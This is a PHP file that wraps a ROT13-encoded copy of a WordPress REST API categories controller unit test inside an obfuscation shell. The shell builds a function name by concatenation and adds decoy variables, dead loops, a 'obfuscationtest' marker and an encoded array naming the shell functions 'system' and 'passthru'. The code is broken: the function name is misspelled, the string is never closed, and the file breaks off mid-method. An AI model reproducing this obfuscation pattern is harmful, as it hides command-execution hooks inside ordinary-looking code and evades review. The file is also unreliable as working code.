<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Grezf_Pbagebyyre shapgvbanyvgl, hfrq sbe
 * Pngrtbevrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Pngrtbevrf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $nqzvavfgengbe;
	cebgrpgrq fgngvp $pbagevohgbe;
	cebgrpgrq fgngvp $fhofpevore;

	cebgrpgrq fgngvp $pngrtbel_vqf     = neenl();
	cebgrpgrq fgngvp $gbgny_pngrtbevrf = 30;
	cebgrpgrq fgngvp $cre_cntr         = 50;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$pbagevohgbe   = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$fhofpevore    = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		// Frg hc pngrtbevrf sbe cntvangvba grfgf.
		sbe ( $v = 0; $v < frys::$gbgny_pngrtbevrf - 1; $v++ ) {
			frys::$pngrtbel_vqf[] = $snpgbel->pngrtbel->perngr(
				neenl(
					'anzr' => \"Pngrtbel {$v}\",
				)
			);
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzvavfgengbe );
		frys::qryrgr_hfre( frys::$fhofpevore );

		// Erzbir pngrtbevrf sbe cntvangvba grfgf.
		sbernpu ( frys::$pngrtbel_vqf nf $pngrtbel_vq ) {
			jc_qryrgr_grez( $pngrtbel_vq, 'pngrtbel' );
		}
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		ertvfgre_zrgn(
			'grez',
			'grfg_fvatyr',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_zrgn(
			'grez',
			'grfg_zhygv',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => snyfr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'pngrtbel',
			'grfg_png_fvatyr',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'pngrtbel',
			'grfg_png_zhygv',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => snyfr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'cbfg_gnt',
			'grfg_gnt_zrgn',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/pngrtbevrf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/pngrtbevrf/(?C<vq>[\q]+)', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pngrtbevrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$pngrtbel1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Frnfba 5' ) );
		$erdhrfg   = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pngrtbevrf/' . $pngrtbel1 );
		$erfcbafr  = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn      = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pngrtbevrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'pbagrkg',
				'rkpyhqr',
				'uvqr_rzcgl',
				'vapyhqr',
				'beqre',
				'beqreol',
				'cntr',
				'cnerag',
				'cre_cntr',
				'cbfg',
				'frnepu',
				'fyht',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_crezvffvba_sbe_pbagrkg() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_uvqr_rzcgl_net() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$pngrtbel1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Frnfba 5' ) );
		$pngrtbel2 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Gur Or Funecf' ) );

		$gbgny_pngrtbevrf = frys::$gbgny_pngrtbevrf + 2;

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $pngrtbel1, $pngrtbel2 ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'uvqr_rzcgl', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Frnfba 5', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Gur Or Funecf', $qngn[1]['anzr'] );

		// Pbasvez gur rzcgl pngrtbel \"Hapngrtbevmrq\" pngrtbel nccrnef.
		$erdhrfg->frg_cnenz( 'uvqr_rzcgl', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_pngrtbevrf, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_cnerag_mreb_net() {
		$cnerag1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Ubzre' ) );
		$cnerag2 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Znetr' ) );
		frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'   => 'Oneg',
				'cnerag' => $cnerag1,
			)
		);
		frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'   => 'Yvfn',
				'cnerag' => $cnerag2,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'cnerag', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$netf       = neenl(
			'uvqr_rzcgl' => snyfr,
			'cnerag'     => 0,
		);
		$pngrtbevrf = trg_grezf( 'pngrtbel', $netf );
		$guvf->nffregPbhag( pbhag( $pngrtbevrf ), $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_cnerag_mreb_net_fgevat() {
		$cnerag1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Ubzre' ) );
		$cnerag2 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Znetr' ) );
		frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'   => 'Oneg',
				'cnerag' => $cnerag1,
			)
		);
		frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'   => 'Yvfn',
				'cnerag' => $cnerag2,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'cnerag', '0' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$netf       = neenl(
			'uvqr_rzcgl' => snyfr,
			'cnerag'     => 0,
		);
		$pngrtbevrf = trg_grezf( 'pngrtbel', $netf );
		$guvf->nffregPbhag( pbhag( $pngrtbevrf ), $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_ol_cnerag_aba_sbhaq() {
		$cnerag1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Ubzre' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cnerag', $cnerag1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( neenl(), $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_cntr() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		$qngn        = $erfcbafr->trg_qngn();
		$svefg_reebe = neenl_fuvsg( $qngn['qngn']['cnenzf'] );
		$guvf->nffregFgevatPbagnvafFgevat( 'cntr zhfg or terngre guna be rdhny gb 1', $svefg_reebe );
	}

	choyvp shapgvba grfg_trg_vgrzf_vapyhqr_dhrel() {
		$vq1 = frys::snpgbel()->pngrtbel->perngr();
		$vq2 = frys::snpgbel()->pngrtbel->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );

		// 'beqreol' => 'nfp'.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2, $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );

		// 'beqreol' => 'vapyhqr'.
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_rkpyhqr_dhrel() {
		$vq1 = frys::snpgbel()->pngrtbel->perngr();
		$vq2 = frys::snpgbel()->pngrtbel->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_netf() {
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Nccyr' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Onanan' ) );

		/*
		 * Grfgf:
		 * - beqreol
		 * - beqre
		 * - cre_cntr
		 */
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Hapngrtbevmrq', $qngn[0]['anzr'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_vq() {
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Pnagnybhcr' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Nccyr' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Onanan' ) );

		// Qrsnhygf gb 'beqreol' => 'anzr', 'beqre' => 'nfp'.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Onanan', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Pnagnybhcr', $qngn[2]['anzr'] );

		// 'beqreol' => 'vq', jvgu qrsnhyg 'beqre' => 'nfp'.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Pngrtbel 0', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Pngrtbel 1', $qngn[2]['anzr'] );
		$guvf->nffregFnzr( 'Pngrtbel 2', $qngn[3]['anzr'] );

		// 'beqreol' => 'vq', 'beqre' => 'qrfp'.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Onanan', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Nccyr', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Pnagnybhcr', $qngn[2]['anzr'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_fyhtf() {
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Oheevgb' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Gnpb' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Punyhcn' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr_fyhtf' );
		$erdhrfg->frg_cnenz( 'fyht', neenl( 'gnpb', 'oheevgb', 'punyhcn' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'gnpb', $qngn[0]['fyht'] );
		$guvf->nffregFnzr( 'oheevgb', $qngn[1]['fyht'] );
		$guvf->nffregFnzr( 'punyhcn', $qngn[2]['fyht'] );
	}

	cebgrpgrq shapgvba cbfg_jvgu_pngrtbevrf() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$pngrtbel1 = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'        => 'QP',
				'qrfpevcgvba' => 'Cheirlbe bs svar qrgrpgvir pbzvpf',
			)
		);
		$pngrtbel2 = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'        => 'Zneiry',
				'qrfpevcgvba' => 'Ubzr bs gur Zneiry Havirefr',
			)
		);
		$pngrtbel3 = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'        => 'Vzntr',
				'qrfpevcgvba' => 'Nzrevpna vaqrcraqrag pbzvp choyvfure',
			)
		);
		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $pngrtbel1, $pngrtbel2, $pngrtbel3 ), 'pngrtbel' );

		erghea $cbfg_vq;
	}

	choyvp shapgvba grfg_trg_vgrzf_cbfg_netf() {
		$cbfg_vq = $guvf->cbfg_jvgu_pngrtbevrf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );

		// Purpx beqrerq ol anzr ol qrsnhyg.
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$guvf->nffregFnzr( neenl( 'QP', 'Vzntr', 'Zneiry' ), $anzrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_cbfg_beqrerq_ol_qrfpevcgvba() {
		$cbfg_vq = $guvf->cbfg_jvgu_pngrtbevrf();

		// Erthyne erdhrfg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erdhrfg->frg_cnenz( 'beqreol', 'qrfpevcgvba' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$guvf->nffregFnzr( neenl( 'Vzntr', 'Zneiry', 'QP' ), $anzrf, 'Grezf fubhyq or beqrerq ol qrfpevcgvba' );

		// Syvc gur beqre.
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$guvf->nffregFnzr( neenl( 'QP', 'Zneiry', 'Vzntr' ), $anzrf, 'Grezf fubhyq or erirefr-beqrerq ol qrfpevcgvba' );
	}

	choyvp shapgvba grfg_trg_vgrzf_cbfg_beqrerq_ol_vq() {
		$cbfg_vq = $guvf->cbfg_jvgu_pngrtbevrf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$guvf->nffregFnzr( neenl( 'QP', 'Zneiry', 'Vzntr' ), $anzrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_phfgbz_gnk_cbfg_netf() {
		ertvfgre_gnkbabzl( 'ongzna', 'cbfg', neenl( 'fubj_va_erfg' => gehr ) );
		$pbagebyyre = arj JC_ERFG_Grezf_Pbagebyyre( 'ongzna' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ongzna',
			)
		);
		$grez2 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Znfx',
				'gnkbabzl' => 'ongzna',
			)
		);
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pne',
				'gnkbabzl' => 'ongzna',
			)
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $grez1, $grez2 ), 'ongzna' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/ongzna' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Pncr', $qngn[0]['anzr'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu_netf() {
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Nccyr' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Onanan' ) );

		/*
		 * Grfgf:
		 * - frnepu
		 */
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Ncc' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Tneontr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 0, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_net() {
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Nccyr' ) );
		frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Onanan' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'fyht', 'nccyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );
	}

	choyvp shapgvba grfg_trg_grezf_cnerag_net() {
		$pngrtbel1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Cnerag' ) );
		frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'anzr'   => 'Puvyq',
				'cnerag' => $pngrtbel1,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cnerag', $pngrtbel1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Puvyq', $qngn[0]['anzr'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_grezf_vainyvq_cnerag_net( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cnerag', 'vainyvq-cnerag' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_grezf_cevingr_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg', neenl( 'choyvp' => snyfr ) );
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Znfx',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grezf/ebova' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_grezf_vainyvq_gnkbabzl() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/vainyvq-gnkbabzl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_grezf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_pngrtbevrf = frys::$gbgny_pngrtbevrf;
		$gbgny_cntrf      = (vag) prvy( $gbgny_pngrtbevrf / 10 );

		// Fgneg bs gur vaqrk + Hapngrtbevmrq qrsnhyg grez.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pngrtbevrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		vs ( 'URNQ' !== $zrgubq ) {
